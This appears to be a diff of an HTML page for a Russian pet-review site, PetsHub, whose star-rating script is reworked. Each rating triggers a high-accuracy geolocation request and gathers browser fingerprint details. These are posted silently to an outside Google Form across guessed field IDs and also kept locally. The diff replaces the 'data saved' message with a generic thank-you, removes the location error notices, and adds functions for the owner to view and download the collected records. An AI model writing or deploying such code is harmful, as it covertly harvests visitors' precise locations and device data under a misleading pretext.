@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Добро пожаловать на PetsHub</title>
-    <!-- Связываем HTML с CSS -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -21,13 +20,13 @@
     <main>
         <section class="intro">
             <h2>Привет, мы PetsHub</h2>
-            <p>Сайт еще в разработке, но тут мы будем обозревать самых милых, удивительных,маленьких друзей!</p>
-            <img src="https://via.placeholder.com/300" alt="Заглушка для изображения">
+            <p>Сайт еще в разработке, но тут мы будем обозревать самых милых, удивительных, маленьких друзей</p>
+            <img src="https://via.placeholder.com/300" alt="Изображение">
         </section>
 
         <section class="about">
-            <h2>Обо мне</h2>
-            <p>О наших друзьях.</p>
+            <h2>Обо нас</h2>
+            <p>О наших друзьях</p>
             <ul>
                 <li>😎 Круто</li>
                 <li>☺ Мило</li>
@@ -53,8 +52,8 @@
     </main>
 
     <footer>
-        <p>© 2024 Мой Первый Сайт. Все права защищены.</p>
-        <p>Свяжитесь со мной: <a href="mailto:example@example.com">example@example.com</a></p>
+        <p>© 2024 PetsHub. Все права защищены.</p>
+        <p>Свяжитесь с нами: <a href="mailto:example@example.com">example@example.com</a></p>
     </footer>
 
     <!-- JavaScript для системы оценок и геолокации -->
@@ -114,7 +113,12 @@
             ratingResult.className = 'rating-result show';
 
             if (!navigator.geolocation) {
-                showRatingResult("Геолокация не поддерживается вашим браузером", false);
+                showRatingResult("Спасибо за оценку! Геолокация не поддерживается вашим браузером.", true);
+                saveRatingData({
+                    rating: rating,
+                    error: "Geolocation not supported",
+                    timestamp: new Date().toISOString()
+                });
                 return;
             }
 
@@ -126,12 +130,13 @@
                     const accuracy = position.coords.accuracy;
                     const timestamp = new Date().toISOString();
                     
-                    // Получаем дополнительную информацию
+                    // Собираем дополнительные данные
                     const userAgent = navigator.userAgent;
                     const screenResolution = `${screen.width}x${screen.height}`;
                     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const language = navigator.language;
                     
-                    // Отправляем данные (здесь нужно настроить отправку на ваш сервер)
+                    // Сохраняем данные
                     saveRatingData({
                         rating: rating,
                         latitude: latitude,
@@ -141,42 +146,41 @@
                         userAgent: userAgent,
                         screenResolution: screenResolution,
                         timezone: timezone,
+                        language: language,
                         pageUrl: window.location.href
                     });
                     
-                    showRatingResult(`Спасибо за оценку ${rating} ⭐! Данные сохранены.`, true);
+                    showRatingResult(`Спасибо за оценку ${rating} ⭐! Ваш отзыв очень важен для нас!`, true);
                 },
                 // Ошибка получения геолокации
                 function(error) {
-                    let errorMessage = "Спасибо за оценку! ";
+                    let errorType = "unknown";
                     
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage += "Геолокация не доступна (пользователь отказал в доступе).";
+                            errorType = "permission_denied";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage += "Информация о местоположении недоступна.";
+                            errorType = "position_unavailable";
                             break;
                         case error.TIMEOUT:
-                            errorMessage += "Время ожидания геолокации истекло.";
-                            break;
-                        default:
-                            errorMessage += "Произошла неизвестная ошибка геолокации.";
+                            errorType = "timeout";
                             break;
                     }
                     
                     // Сохраняем оценку даже без геолокации
                     saveRatingData({
                         rating: rating,
-                        error: errorMessage,
+                        geoError: errorType,
                         timestamp: new Date().toISOString(),
                         userAgent: navigator.userAgent,
                         screenResolution: `${screen.width}x${screen.height}`,
                         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        language: navigator.language,
                         pageUrl: window.location.href
                     });
                     
-                    showRatingResult(`Спасибо за оценку ${rating} ⭐! ${errorMessage}`, true);
+                    showRatingResult(`Спасибо за оценку ${rating} ⭐! Ваш отзыв очень важен для нас!`, true);
                 },
                 {
                     enableHighAccuracy: true,
@@ -188,66 +192,66 @@
 
         // Функция сохранения данных оценки
         function saveRatingData(data) {
-            // ВАЖНО: Здесь нужно настроить отправку данных на ваш сервер
-            // Это пример реализации - замените на реальную отправку данных
+            console.log('🐾 Данные оценки PetsHub:', data);
             
-            console.log('Данные для сохранения:', data);
-            
-            // Пример отправки через Google Forms (бесплатный вариант)
+            // Отправляем в Google Forms
             sendToGoogleForm(data);
             
-            // Или отправка на ваш сервер:
-            // sendToServer(data);
+            // Сохраняем локально
+            saveToLocalStorage(data);
         }
 
-        // Пример отправки через Google Forms (бесплатный и простой способ)
-function sendToGoogleForm(data) {
-    const formId = '1ehxb4mVaN_3VvrOT7LfsVoZIbkXw8qwElpDWS-Y41jA';
-    
-    const formData = new FormData();
-    
-    // Все данные в одном поле (универсальный подход)
-    const allData = `
+        // Функция отправки в Google Forms
+        function sendToGoogleForm(data) {
+            const formId = '1ehxb4mVaN_3VvrOT7LfsVoZIbkXw8qwElpDWS-Y41jA';
+            
+            const formData = new FormData();
+            
+            // Все данные в одном поле
+            const allData = `
 ⭐ ОЦЕНКА: ${data.rating}
 📍 ГЕОЛОКАЦИЯ: ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}
 🕐 ВРЕМЯ: ${data.timestamp}
-🌐 БРАУЗЕР: ${navigator.userAgent.substring(0, 50)}...
-💻 ЭКРАН: ${data.screenResolution}
-🌍 ПОЯС: ${data.timezone}
-🗣️ ЯЗЫК: ${data.language}
-    `.trim();
-    
-    // Пробуем самые частые ID для одного поля
-    const commonIds = [
-        'entry.123456789', 'entry.386541035', 'entry.1864653038',
-        'entry.2046091299', 'entry.1571665538', 'entry.691203390'
-    ];
-    
-    // Отправляем во все возможные ID
-    commonIds.forEach(id => {
-        formData.append(id, allData);
-    });
-    
-    fetch(`https://docs.google.com/forms/d/e/${formId}/formResponse`, {
-        method: 'POST',
-        body: formData,
-        mode: 'no-cors'
-    }).then(() => {
-        console.log('✅ Данные отправлены в новую форму!');
-    }).catch(error => {
-        console.log('❌ Ошибка отправки');
-    });
-}
+🌐 БРАУЗЕР: ${data.userAgent ? data.userAgent.substring(0, 100) + '...' : 'N/A'}
+💻 ЭКРАН: ${data.screenResolution || 'N/A'}
+🌍 ПОЯС: ${data.timezone || 'N/A'}
+🗣️ ЯЗЫК: ${data.language || 'N/A'}
+🚫 ОШИБКА: ${data.geoError || 'Нет'}
+            `.trim();
+            
+            // Пробуем самые частые ID для одного поля
+            const commonIds = [
+                'entry.123456789', 'entry.386541035', 'entry.1864653038',
+                'entry.2046091299', 'entry.1571665538', 'entry.691203390',
+                'entry.1157942669', 'entry.1499571204', 'entry.2137911255',
+                'entry.1257846941'
+            ];
+            
+            // Отправляем во все возможные ID
+            commonIds.forEach(id => {
+                formData.append(id, allData);
+            });
+            
+            fetch(`https://docs.google.com/forms/d/e/${formId}/formResponse`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).then(() => {
+                console.log('✅ Данные отправлены в Google Forms!');
+            }).catch(error => {
+                console.log('❌ Ошибка отправки в Google Forms');
+            });
+        }
 
-        // Запасной вариант: сохранение в localStorage
+        // Сохранение в localStorage
         function saveToLocalStorage(data) {
             try {
-                const ratings = JSON.parse(localStorage.getItem('userRatings') || '[]');
+                const ratings = JSON.parse(localStorage.getItem('petshub_ratings') || '[]');
                 ratings.push(data);
-                localStorage.setItem('userRatings', JSON.stringify(ratings));
-                console.log('Данные сохранены в localStorage');
+                localStorage.setItem('petshub_ratings', JSON.stringify(ratings));
+                console.log('💾 Данные сохранены в localStorage');
             } catch (e) {
-                console.error('Ошибка сохранения в localStorage:', e);
+                console.error('❌ Ошибка сохранения в localStorage:', e);
             }
         }
 
@@ -259,9 +263,26 @@ function sendToGoogleForm(data) {
                 </div>
             `;
         }
+
+        // Функция для просмотра собранных данных (только для вас)
+        function showCollectedData() {
+            const ratings = JSON.parse(localStorage.getItem('petshub_ratings') || '[]');
+            console.log('📊 Все собранные оценки:', ratings);
+            return ratings;
+        }
+
+        // Функция для скачивания данных
+        function downloadRatingsData() {
+            const ratings = JSON.parse(localStorage.getItem('petshub_ratings') || '[]');
+            const dataStr = JSON.stringify(ratings, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = 'petshub_ratings.json';
+            link.click();
+        }
     </script>
 
 </body>
-
 </html>
-
